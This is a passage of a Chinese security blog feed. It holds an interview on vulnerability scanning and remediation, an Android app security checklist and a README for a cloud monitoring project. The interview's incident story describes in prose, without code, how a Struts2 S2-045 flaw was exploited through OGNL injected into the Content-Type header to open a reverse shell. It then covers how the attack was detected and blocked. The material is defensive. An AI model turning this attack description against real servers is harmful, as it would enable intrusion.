title="安全牛：当下漏洞扫描工具类型包括主动和被动两种,请您谈谈二者的区别？哪些需要深入监控、复杂的关键环境该如何选择风险评估工具？"></a><strong>安全牛：当下漏洞扫描工具类型包括主动和被动两种,请您谈谈二者的区别？哪些需要深入监控、复杂的关键环境该如何选择风险评估工具？</strong></h1><p><strong>张福：</strong>新的漏洞每天都会出现、系统配置每分钟都在变化。同时，黑客通过对新技术的利用，攻击速度和能力都得到大幅提升。这些变化决定企业安全状态一直处于动态变化过程中，所以持续安全监控显得尤为重要。因此，安全人员需要通过专业的风险评估工具，对漏洞进行持续检测、移除和控制，来缩小攻击面。</p><p>当下漏洞扫描工具类型包括主动和被动两种，即基于Agent和Agentless。尽管Agentless监控解决方案和几年前相比，功能更加强大，但与基于Agent的解决方案相比，Agentless解决方案的应用往往极为有限。基于Agent监控的解决方案是通过监控操作系统内部运行的进程实现的，与Agentless解决方案相比，基于Agent的监控通常可以更深入地了解操作系统的运行状况。</p><p>基于Agent监控的解决方案如此强大的原因之一是因为它们可以监控终端多个层面的内容。当然，并非所有产品都会检查各个方面，但通常情况下，与Agentless产品相比，基于Agent解决方案的产品能够提供更细粒度的主机运行状况。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2020/03/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200309105508.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2020/03/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200309105508.png"></a></p><p><strong>基于Agent的监控</strong></p><p>虽然很难否认Agentless监控的便利性，但是Agentless解决方案依赖于通过网络段“嗅探”或查询从网络端点获取的数据，这些方法获得的监控数据类型有限。基于Agent的解决方案可以直接访问受监控的端点，因此能够获取非常细粒度的监控数据。</p><p>据研究表明，Agentless和基于Agent的IT系统管理解决方案的性能下降基本相同。但是，基于Agent的解决方案提供了固有的可用性和安全性优势，包括在网络中断期间管理系统的能力以及无需额外配置即可管理防火墙周围系统的能力。</p><p>由于基于Agent的解决方案和Agentless解决方案各有优缺点，因此一些供应商使用混合监控的解决方案，使用多种监控技术而不是依赖于单一方法。目的是为了既可以使用Agentless监控，又可以基于Agent实现更细粒度的监控。因此，建议尽可能采用Agent监控方式，尤其是对于那些需要深入监控的、复杂的关键环境，基于Agent的方法更为合适。</p><h1 id="安全牛：请您谈谈，漏洞修复过程应该注意哪些问题，才能真正达到您提出的“百战不殆”的境界？"><a href="#安全牛：请您谈谈，漏洞修复过程应该注意哪些问题，才能真正达到您提出的“百战不殆”的境界？" class="headerlink" title="安全牛：请您谈谈，漏洞修复过程应该注意哪些问题，才能真正达到您提出的“百战不殆”的境界？"></a>安全牛：请您谈谈，漏洞修复过程应该注意哪些问题，才能真正达到您提出的“百战不殆”的境界？</h1><p><strong>张福：</strong>漏洞修复是漏洞管理最重要的步骤之一，一旦出错将会对企业产生重要影响。因此，尽快根据漏洞优先级进行修复，并将系统风险降到最低，这一点尤为重要。但是传统人工排查漏洞、提供修复建议以及打补丁的过程费时费力，而且出错率高。众所周知，复杂的修复过程会导致企业组织选择延迟修复，这些积累的“技术债务”对于企业而言就是一个定时炸弹。</p><p>为简化补丁处理过程以及将成本降到最低，建议采用自动化的补丁管理解决方案。毕竟，安全专家作为稀缺资源，不应该被束缚在那些可以通过自动化解决的简单重复工作任务中。他们应该去解决那些自动化工具解决不了的问题，例如，确定补丁的优先级并对这些补丁的应用提供指导建议等。</p><p>在漏洞修复时，自动化的漏洞管理解决方案能够以可视化方式全面展示风险状况并输出对应安全报告，让安全人员对于风险概况、整体趋势等有一个详细的了解。当然，对于一线操作人员而言，最有用的报告功能是了解需要修复哪些漏洞，以及如何完成该任务。因此，报告应该介绍风险的严重性、漏洞的检测细节和修复步骤，帮助安全人员尽快完成漏洞修复任务。同时，为满足不同职位人员的需求，自动化的漏洞管理解决方案应该支持根据需求定制风险信息的类型和展现形式。</p><p>此外，扫描报告应该全面、具体、易于理解、无漏报和误报。误报会占用IT人员大量的精力和时间进行排查，而漏报则会导致因为存在未修补漏洞而被黑客利用的严重风险。通常情况下，漏洞报告至少包括以下4块内容：</p><p>1. 风险概览，提供一个“一目了然”的风险评级及各风险点概况和趋势。</p><p>2. 风险汇总，按优先级列出所有风险点。</p><p>3. 风险分析，详细描述资产面临的具体威胁，并允许对具体问题进行深入审查。</p><p>4. 补丁报告，显示补丁的状态以及负责人。</p><h1 id="安全牛：能否给我们举一个真实的漏洞响应案例？让我们也体验下与黑客正面交锋的真实感受？"><a href="#安全牛：能否给我们举一个真实的漏洞响应案例？让我们也体验下与黑客正面交锋的真实感受？" class="headerlink" title="安全牛：能否给我们举一个真实的漏洞响应案例？让我们也体验下与黑客正面交锋的真实感受？"></a><strong>安全牛：能否给我们举一个真实的漏洞响应案例？让我们也体验下与黑客正面交锋的真实感受？</strong></h1><p><strong>张福：</strong>当然可以。下面通过我亲身经历的一个故事，跟大家分享下在Struts2爆发后，我们的整个响应过程。</p><p>某天半夜凌晨，接到公司打来的一个紧急求助电话。</p><p>我赶紧打开电脑查看报警邮件，提示存在一个反弹Shell的攻击行为。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2020/03/%E5%9B%BE%E7%89%875-8.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2020/03/%E5%9B%BE%E7%89%875-8.png"></a></p><p>深更半夜，服务器居然正在主动尝试连接外部其它服务器。在那个瞬间，我都能想象得出来，服务器另一端那个穿着“黑衣服”的人，面对“冒着新鲜热气儿”的Shell唾手可得的那种狂喜。显然，黑客正在疯狂攻击，情况甚是紧急，需要在黑客造成真正破坏之前阻止他们。</p><p>做技术的人都知道，反弹Shell一般是外网渗透的最后一步，也是内网渗透的第一步。反弹Shell对服务器安全乃至内网安全的危害不必多说。</p><p>多年的一线拼杀经验告诉我，黑客一般是利用远程命令执行、远程代码执行、Webshell、Redis未授权访问可执行系统命令等漏洞，执行反弹命令，使目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则。</p><p><strong>① 初试无果</strong></p><p>虽然我们记录了展示每台服务器系统交互的Shell命令，包括操作者IP、操作终端、操作用户、操作详情等关键信息，但是出乎意料的是，在反弹Shell这十几分钟时间内，日志上居然没发现任何黑客执行反弹Shell操作等相关的异常操作行为。</p><p><strong>② 改变思路</strong></p><p>显然，黑客不是通过在服务器端执行命令的常规方式进行反弹，但一定是有其它资产存在漏洞，被黑客利用了。为了找到根本原因，我全面清点了一下该主机上运行的资产（如虚拟机、web站点、web服务、web框架等），发现该服务器上存在Struts 2的Web框架，凑巧的是该版本正好存在S2-045漏洞。</p><p>要说著名的RCE（远程代码执行）漏洞，Struts2框架漏洞最为“经典”，一经爆发就被各安全厂商作为高危紧急漏洞处理。S2-045漏洞是由报错信息包含OGNL表达式，并且被带入了buildErrorMessage这个方法运行，造成远程代码执行。S2-045只有一种触发形式，就是将OGNL表达式注入到HTTP头的Content-Type中。</p><p><strong>③ 柳暗花明</strong></p><p>为确认真正攻击源，通过查看Tomcat日志发现存在反弹Shell行为的恶意IP，正在通过post请求方式访问客户服务器上一个Struts2页面。至此，基本可以判断攻击者正是通过Struts2的反序列化漏洞进行攻击，从而完成反弹Shell的操作。值得庆幸，因为及时发现和快速响应，黑客的攻击行为未对服务器造成任何伤害。</p><p><strong>④ 进行反击</strong></p><p>首先通过防火墙立即封堵该IP，同时在WAF上设置规则，拦截该请求，进一步对Struts2漏洞立马打补丁。</p><p>攻防的较量从未停止，黑客与白帽子间的斗争也越演越烈。在Struts2框架漏洞这个战场上，需要持续深入地研究，才能占有主动权。虽然从过去出现的Struts漏洞看，恶意OGNL表达式的注入点无处不在，但随着Struts2框架版本不停迭代，很多漏洞都被修补。</p><p>在这里，也提醒各位安全人员，一定要及时打补丁并使用最新版的Struts框架，避免被不法分子利用而造成损失。同时，对request请求的参数名、参数值、cookie参数名、action的名称、Content-Type内容、filename内容、请求体内容（反序列化漏洞）进行验证，降低后期被黑客利用的可能性。</p><h1 id="安全牛：最后，请您给我们分享一些，企业如何在有限的条件下，提高漏洞响应优先级排序的效率的安全锦囊吧？"><a href="#安全牛：最后，请您给我们分享一些，企业如何在有限的条件下，提高漏洞响应优先级排序的效率的安全锦囊吧？" class="headerlink" title="安全牛：最后，请您给我们分享一些，企业如何在有限的条件下，提高漏洞响应优先级排序的效率的安全锦囊吧？"></a><strong>安全牛：最后，请您给我们分享一些，企业如何在有限的条件下，提高漏洞响应优先级排序的效率的安全锦囊吧？</strong></h1><p><strong>张福：</strong>好的。大多数企业的安全部门并不具备充足的人力对所有漏洞进行实时响应。因此，为了最有效地利用有限的人力、物力资源，需要对漏洞响应进行优先级排序。当然只有准确地对漏洞进行风险评估，才能真正地改善漏洞管理。对此，建议从以下六个方面，提高漏洞响应优先级排序的效率。</p><p>1. <strong>对关键资产清单进行及时更新</strong>。精确掌握哪些资产有风险以及攻击者最有可能对哪里进行攻击。</p><p>2. <strong>引入威胁情报，为漏洞修复提供支持</strong>。情报能让用户及时了解新发生的重大漏洞，继而对漏洞修复给出更有效的建议。</p><p>3. <strong>建立相关的安全合规基线</strong>。包括操作系统补丁更新、相关配置需要满足安全规范的要求，杜绝新设备“带病”入网。</p><p>4. <strong>使用持续的安全评估</strong>。可以通过基于Agent持续监控、安全日志、流量分析、CMDB等多种方式全面掌握资产变化带来的风险。</p><p>5. <strong>建立漏洞修复优先级排序</strong>。综合资产的暴露位置、资产重要性、是否有防护手段、漏洞有无POC、漏洞利用热度等指标，对资产漏洞修复工作进行排序。</p><p>6. <strong>自动化漏洞修复方案</strong>。尽量采用自动化补丁修复方案，减少安全运维人员工作量。</p><p>安全牛独家应用报告《2020高效漏洞管理指南》即日起接受预定。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 信息安全管理理念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android_security_checklist</title>
      <link href="/2021/06/15/android-security-checklist/"/>
      <url>/2021/06/15/android-security-checklist/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="转自：-http-01hackcode-com-index"><a href="#转自：-http-01hackcode-com-index" class="headerlink" title="转自： http://01hackcode.com/index"></a>转自： <a href="http://01hackcode.com/index">http://01hackcode.com/index</a><h1 id="Checklist"><a href="#Checklist" class="headerlink" title="Checklist"></a>Checklist</h1><h2 id="Checklist整理"><a href="#Checklist整理" class="headerlink" title="Checklist整理"></a>Checklist整理</h2><h3 id="一、静态扫描"><a href="#一、静态扫描" class="headerlink" title="一、静态扫描"></a>一、静态扫描</h3><h3 id="1-文件信息"><a href="#1-文件信息" class="headerlink" title="1 文件信息"></a>1 文件信息</h3><h3 id="2-证书检测"><a href="#2-证书检测" class="headerlink" title="2 证书检测"></a>2 证书检测</h3><h3 id="3-权限信息检测"><a href="#3-权限信息检测" class="headerlink" title="3 权限信息检测"></a>3 权限信息检测</h3><h3 id="4-so文件检测"><a href="#4-so文件检测" class="headerlink" title="4 so文件检测"></a>4 so文件检测</h3><h3 id="5-第三方库-SDK-组件检测"><a href="#5-第三方库-SDK-组件检测" class="headerlink" title="5 第三方库/SDK/组件检测"></a>5 第三方库/SDK/组件检测</h3><h5 id="第三方开源库-SDK检测"><a href="#第三方开源库-SDK检测" class="headerlink" title="第三方开源库/SDK检测"></a>第三方开源库/SDK检测</h5><h3 id="6-manifest文件检测"><a href="#6-manifest文件检测" class="headerlink" title="6 manifest文件检测"></a>6 manifest文件检测</h3><p>6.1 AndroidManifest文件中PermissionGroup检测<br>6.2 AndroidManifest文件中系统权限使用检测<br>6.3 AndroidManifest危险ProtectionLevel权限检测<br>6.4 AndroidManifest sharedUserId 检测<br>6.5 AndroidManifest allowBackup标志检测<br>6.6 AndroidManifest文件Debuggable配置检测<br>6.7 非必要权限检测<br>6.8 app最低版本检测</p><h3 id="7-组件安全检测"><a href="#7-组件安全检测" class="headerlink" title="7 组件安全检测"></a>7 组件安全检测</h3><p>7.1 Activity、activity-alias、service、receiver组件导出检测<br>7.2 ContentProvider组件导出检测<br>7.3 ContentProvider目录遍历漏洞检测<br>7.4 Implicit Service漏洞检测<br>7.5 Provider：grant-uri-permission属性检测<br>7.6 Intent-Based攻击检测<br>7.7 Intent Scheme URI漏洞攻击检测<br>7.8 应用本地拒绝服务漏洞检测<br>7.9 manifest中定义组件未实现检测<br>7.10 Debug或Test敏感测试组件泄露检测<br>7.11 Intent不安全反射风险检测</p><h3 id="8-webview组件安全检测"><a href="#8-webview组件安全检测" class="headerlink" title="8 webview组件安全检测"></a>8 webview组件安全检测</h3><p>8.1 WebView远程执行漏洞检测<br>8.2 WebView潜在XSS攻击检测<br>8.3 WebView本地文件访问漏洞检测<br>8.4 WebView密码明文存储漏洞检测<br>8.5 主机名弱校验检测<br>8.6 证书弱校验检测<br>8.7 中间人攻击漏洞检测<br>8.8 WebView不校验证书漏洞检测<br>8.9 WebView组件系统隐藏接口未移除漏洞</p><h3 id="9-sqlite安全检测"><a href="#9-sqlite安全检测" class="headerlink" title="9 sqlite安全检测"></a>9 sqlite安全检测</h3><p>9.1 SQLite数据库加密(SQLCipher)检测<br>9.2 SQLite数据库(SQLite Encryption Extension (SEE)) 检测<br>9.3 SQLite数据库的对称密钥(PRAGMA key) 检测<br>9.4 SQLiteDatabase Transaction Deprecated检测<br>9.5 Databases任意读写漏洞检测</p><h3 id="10-网络通信安全检测"><a href="#10-网络通信安全检测" class="headerlink" title="10 网络通信安全检测"></a>10 网络通信安全检测</h3><p>10.1 SSL连接检测<br>10.2 SSL不安全组件检测<br>10.3 HttpHost检测<br>10.4 HttpURLConnection漏洞检测<br>10.5 网络端口开放威胁检测</p><h3 id="11-弱加密风险检测"><a href="#11-弱加密风险检测" class="headerlink" title="11 弱加密风险检测"></a>11 弱加密风险检测</h3><p>11.1 弱加密算法风险检测<br>11.2 不安全的密钥长度风险检测<br>11.3 ECB弱加密模式风险检测<br> 11.4 IVParameterSpec不安全初始化向量风险检测<br> 11.5 RSA中不使用Padding风险检测<br> 11.6 检测keystore是否使用密码保护</p><h3 id="12-数据安全检测"><a href="#12-数据安全检测" class="headerlink" title="12 数据安全检测"></a>12 数据安全检测</h3><p>12.1 敏感信息检测<br>12.2 剪贴板敏感信息泄露风险检测<br>12.3 Intent敏感数据泄露风险检测<br> 12.4 PendingIntent误用风险<br>12.5 密钥硬编码风险检测<br> 12.6 数据或程序加载检查<br> 12.7 BASE64安全检测<br> 12.8 文件全局读写漏洞检测<br> 12.9 日志泄露风险检测<br> 12.10 外部加载Dex检测<br> 12.11 外部存储路径检测<br> 12.12 明文数字证书风险<br> 12.13 第三方oauth敏感信息泄露</p><h3 id="13-敏感函数调用检测"><a href="#13-敏感函数调用检测" class="headerlink" title="13 敏感函数调用检测"></a>13 敏感函数调用检测</h3><p>13.1 安全相关的函数检测<br>13.2 安全相关的类检测<br>13.3 运行命令检测<br>13.4 Native Library加载检测<br>13.5 外部动态加载DEX检测<br>13.6 root代码检测<br>13.7 获取IMEI 和Device ID敏感信息代码检测<br>13.8 获取Android ID敏感信息代码检测<br>13.9 发送SMS敏感代码检测<br>13.10 文件删除代码检测<br>13.11 signature代码检测</p><h3 id="14-加固检测"><a href="#14-加固检测" class="headerlink" title="14 加固检测"></a>14 加固检测</h3><p>14.1 dex加固检测<br>14.2 So文件加固检测<br>14.3 资源文件加固检测<br> 14.4 混淆率检测</p><h3 id="15-系统漏洞检测"><a href="#15-系统漏洞检测" class="headerlink" title="15 系统漏洞检测"></a>15 系统漏洞检测</h3><p>15.1 fragment注入漏洞检测<br>15.2 sqlite数据库日志泄露漏洞检测<br>15.3 随机数生成漏洞检测</p><h3 id="16-其他"><a href="#16-其他" class="headerlink" title="16 其他"></a>16 其他</h3><p>通用签名风险检测</p><h3 id="二、动态扫描"><a href="#二、动态扫描" class="headerlink" title="二、动态扫描"></a>二、动态扫描</h3><p>1 服务端漏洞检测</p><p>基于http代理<br>水平权限风险检测<br>垂直权限风险检测<br>sql注入漏洞检测<br>XSS漏洞检测<br>敏感信息检测（硬编码、用户密码、银行卡、身份证等明文传输）<br>基于tcp或udp(socket)代理<br>敏感信息检测（硬编码、用户密码、银行卡、身份证等明文传输）<br>html5漏洞检测</p><p>2 hook技术检测</p><p>2.1 SQLite Database存储信息检测<br>2.2 SharePreferences存储信息检测<br>2.3 Contert Provider存储信息检测<br>2.4 File存储信息检测<br>2.5 Intent数据内容检测<br>2.6 Log日志打印检测<br>2.7 System.print*输出检测<br>2.8 剪贴板敏感信息检测</p><p>3 DDOS攻击检测</p><p>3.1 组件DDOS攻击检测<br>Activity组件通用crash<br>Receiver组件通用crash<br>Service组件通用crash<br>3.2 native crash检测<br>3.3 java crash检测</p><p>4 provider注入漏洞检测</p><p>5 网络端口开放威胁检测</p><p>三、业务安全扫描<br>未整理，欢迎大家补充</p><p>四、Checklist脑图：<br>checklist-logo<br><a href="https://www.buhuixiu.com/images/checklist.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/checklist.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云API项目(Python)</title>
      <link href="/2021/06/07/%E8%85%BE%E8%AE%AF%E4%BA%91API%E9%A1%B9%E7%9B%AE-Python/"/>
      <url>/2021/06/07/%E8%85%BE%E8%AE%AF%E4%BA%91API%E9%A1%B9%E7%9B%AE-Python/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。"><a href="#这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。" class="headerlink" title="这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。"></a>这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。<h2 id="1-监控数据的量化分析，持续未解除告警的提醒通告。-重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1-监控对象-2，监控阈值名称-3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。-当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。"><a href="#1-监控数据的量化分析，持续未解除告警的提醒通告。-重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1-监控对象-2，监控阈值名称-3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。-当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。" class="headerlink" title="1, 监控数据的量化分析，持续未解除告警的提醒通告。 重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1,监控对象 2，监控阈值名称 3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。 当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。"></a>1, 监控数据的量化分析，持续未解除告警的提醒通告。 重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1,监控对象 2，监控阈值名称 3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。 当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。</h2><h2 id="2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。-并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。"><a href="#2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。-并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。" class="headerlink" title="2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。 并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。"></a>2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。 并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。</h2><h2 id="3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。"><a href="#3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。" class="headerlink" title="3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。"></a>3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。</h2><h2 id="4，360CERT-安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。"><a href="#4，360CERT-安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。" class="headerlink" title="4，360CERT 安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。"></a>4，360CERT 安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。</h2><h2 id="5，腾讯的每周安全报告推送相应的download-url-腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。"><a href="#5，腾讯的每周安全报告推送相应的download-url-腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。" class="headerlink" title="5，腾讯的每周安全报告推送相应的download url . 腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。"></a>5，腾讯的每周安全报告推送相应的download url . 腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。</h2><h2 id="6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。"><a href="#6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。" class="headerlink" title="6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。"></a>6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。</h2><h2 id="7-云主机安全组巡检功能。-：-具体规则为匹配：高危端口全局开放，端口-amp-协议-‘ALL’-全局开放等"><a href="#7-云主机安全组巡检功能。-：-具体规则为匹配：高危端口全局开放，端口-amp-协议-‘ALL’-全局开放等" class="headerlink" title="7, 云主机安全组巡检功能。 ： 具体规则为匹配：高危端口全局开放，端口 &amp; 协议 == ‘ALL’ 全局开放等"></a>7, 云主机安全组巡检功能。 ： 具体规则为匹配：高危端口全局开放，端口 &amp; 协议 == ‘ALL’ 全局开放等</h2><h2 id="HOW-TO-RUN"><a href="#HOW-TO-RUN" class="headerlink" title="HOW TO RUN"></a>HOW TO RUN</h2><h4 id="1，环境-python-3-6-3-8"><a href="#1，环境-python-3-6-3-8" class="headerlink" title="1，环境      python 3.6 - 3.8"></a>1，环境      python 3.6 - 3.8</h4><h4 id="2-第三方模块安装-pip-install-r-requirements-txt"><a href="#2-第三方模块安装-pip-install-r-requirements-txt" class="headerlink" title="2  第三方模块安装  pip install -r requirements.txt"></a>2  第三方模块安装  pip install -r requirements.txt</h4><h4 id="3，运行-python-scheduler-datasearch-py"><a href="#3，运行-python-scheduler-datasearch-py" class="headerlink" title="3，运行 python scheduler_datasearch.py"></a>3，运行 python scheduler_datasearch.py</h4><h4 id="4，授权，需要配置自己的云-SecretId-SecretKey-到prod-生产-，dev-开发环境-的settings-py-中。common-py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。"><a href="#4，授权，需要配置自己的云-SecretId-SecretKey-到prod-生产-，dev-开发环境-的settings-py-中。common-py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。" class="headerlink" title="4，授权，需要配置自己的云 SecretId  SecretKey 到prod(生产)，dev(开发环境)的settings.py 中。common.py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。"></a>4，授权，需要配置自己的云 SecretId  SecretKey 到prod(生产)，dev(开发环境)的settings.py 中。common.py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。</h4><h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><h4 id="1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。"><a href="#1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。" class="headerlink" title="1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。"></a>1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。</h4><h4 id="2，安全方面，整体感觉腾讯做得比较弱。-而且对云镜得基础版本用户特别不友好。-所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。"><a href="#2，安全方面，整体感觉腾讯做得比较弱。-而且对云镜得基础版本用户特别不友好。-所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。" class="headerlink" title="2，安全方面，整体感觉腾讯做得比较弱。 而且对云镜得基础版本用户特别不友好。 所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。"></a>2，安全方面，整体感觉腾讯做得比较弱。 而且对云镜得基础版本用户特别不友好。 所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。</h4><h4 id="3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。"><a href="#3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。" class="headerlink" title="3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。"></a>3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。</h4><h4 id="4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。-测试先于开发-，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。"><a href="#4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。-测试先于开发-，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。" class="headerlink" title="4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。 测试先于开发 ，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。"></a>4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。 测试先于开发 ，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。</h4><h4 id="5，遇到BUG-，少用print-多用idea-的debug"><a href="#5，遇到BUG-，少用print-多用idea-的debug" class="headerlink" title="5，遇到BUG ，少用print,多用idea 的debug."></a>5，遇到BUG ，少用print,多用idea 的debug.</h4><p><a href="https://www.buhuixiu.com/images/tencent_capi.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/tencent_capi.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo有效快速可复制搬迁</title>
      <link href="/2021/06/06/Hexo%E6%9C%89%E6%95%88%E5%BF%AB%E9%80%9F%E5%8F%AF%E5%A4%8D%E5%88%B6%E6%90%AC%E8%BF%81/"/>
      <url>/2021/06/06/Hexo%E6%9C%89%E6%95%88%E5%BF%AB%E9%80%9F%E5%8F%AF%E5%A4%8D%E5%88%B6%E6%90%AC%E8%BF%81/</url>
      
